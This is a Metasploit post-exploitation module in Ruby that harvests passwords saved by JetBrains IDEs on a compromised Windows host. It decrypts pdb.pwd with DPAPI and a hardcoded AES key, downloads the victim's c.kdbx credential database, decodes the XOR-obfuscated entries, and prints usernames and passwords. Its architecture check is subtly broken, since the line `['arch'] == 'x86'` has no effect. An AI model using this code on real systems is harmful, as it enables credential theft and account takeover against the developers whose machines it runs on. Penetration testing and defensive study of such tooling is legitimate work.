##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'openssl'
require 'tempfile'
require 'base64'
require 'kdbx'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv

  def initialize(info = {})
    super(update_info(info,
                      'Name' => 'JetBrains IDE Passwords',
                      'Description' => 'Obtain passwords from JetBrains IDE',
                      'License' => 'MIT',
                      'Author' => ['Kacper Szurek'],
                      'Platform' => ['win'],
                      'SessionTypes' => ['meterpreter'],
                      'References' =>
                          [
                              ['URL', 'https://github.com/kacperszurek/pentest_teamcity'],
                          ],
                      ))
  end

  def decrypt_data(data)
    rg = session.railgun
    pid = session.sys.process.open.pid
    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)

    mem = process.memory.allocate(1024)
    process.memory.write(mem, data)

    if session.sys.process.each_process.find { |i| i['pid'] == pid }
      ['arch'] == 'x86'

      addr = [mem].pack('V')
      len = [data.length].pack('V')
      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
      len, addr = ret['pDataOut'].unpack('V2')

    else

      addr = [mem].pack('Q')
      len = [data.length].pack('Q')
      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
      len, addr = ret['pDataOut'].unpack('Q2')

    end

    return '' if len == 0
    decrypted = process.memory.read(addr, len)
  end

  def decode_xored_password(password)
    output = ''
    (0..(password.length / 4) - 1).each do |i|
      output << (password[i * 4, 4].hex ^ 0xdfaa).chr
    end
    output
  end

  def run
    if is_system?
      print_warning('Running as SYSTEM, cannot decrypt data')
      return nil
    end

    uid = session.sys.config.getuid
    print_status "Running as user '#{uid}'..."

    env_vars = session.sys.config.getenvs('SYSTEMDRIVE', 'USERNAME')
    sysdrive = env_vars['SYSTEMDRIVE'].strip
    username = env_vars['USERNAME'].strip

    potential_profile_path_1 = "#{sysdrive}\\Users\\#{username}\\"
    potential_profile_path_2 = "#{sysdrive}\\Documents and Settings\\#{username}\\"

    if directory?(potential_profile_path_1)
      @profile_path = potential_profile_path_1

    elsif directory?(potential_profile_path_2)
      @profile_path = potential_profile_path_2

    else
      print_warning('Cannot find profile path')
      return nil
    end

    print_status "Profile path: #{@profile_path}"

    session.fs.dir.foreach(@profile_path) do |u|
      if u =~ /^\.(IntelliJIdea|PyCharm|Idea|PhpStorm|WebStorm|RubyMine|WebIde|AppCode|CLion|DataGrip|AndroidStudio|GoLand|Rider)/
        print_status "Found potential JetBrains dir: #{u}"
        pdb_file = @profile_path + u + '\\config\\pdb.pwd'
        database_file = @profile_path + u + '\config\c.kdbx'
        if file_exist?(pdb_file) and file_exist?(database_file)
          print_status "Found pdb file: #{pdb_file}"
          print_status "Found kdbx file: #{database_file}"

          pdb_file_content = ''
          pdb_file_handler = session.fs.file.new(pdb_file)
          pdb_file_content << pdb_file_handler.read until pdb_file_handler.eof?

          pdb_decrypted = decrypt_data(pdb_file_content)
          if pdb_decrypted == ''
            print_warning('CryptUnprotectData failed')
            next
          end

          print_status 'CryptUnprotectData successful'

          iv_length = pdb_decrypted[0, 4].unpack('l>')[0]
          print_status "IV length: #{iv_length}"
          iv = pdb_decrypted.slice(4, iv_length)

          cipher = OpenSSL::Cipher.new('AES-128-CBC')
          cipher.decrypt
          cipher.key = ['50726F787920436F6E66696720536563'].pack('H*')
          cipher.iv = iv

          begin
            master_password = cipher.update(pdb_decrypted[4 + iv_length, pdb_decrypted.length]) + cipher.final
          rescue StandardError
            print_warning('Cannot decrypt pdb AES')
            next
          end

          print_status "Master password: #{master_password}"

          Tempfile.open('ckdbx') do |f|
            session.fs.file.download_file(f.path, database_file)
            kdbx = Kdbx.open(f.path, password: master_password)

            doc = Nokogiri::XML(kdbx.content)

            doc.xpath('//Entry/String').each do |entry|
              key = entry.at_xpath('Key').text
              val = entry.at_xpath('Value').text

              if key.include? 'Title'
                print_status val
              elsif key.include? 'UserName'
                print_status "Username: #{val}"
              elsif key.include? 'Password'
                print_status "Password: #{decode_xored_password(val)}"
              end
            end
          end
        end
      end
    end
  end
end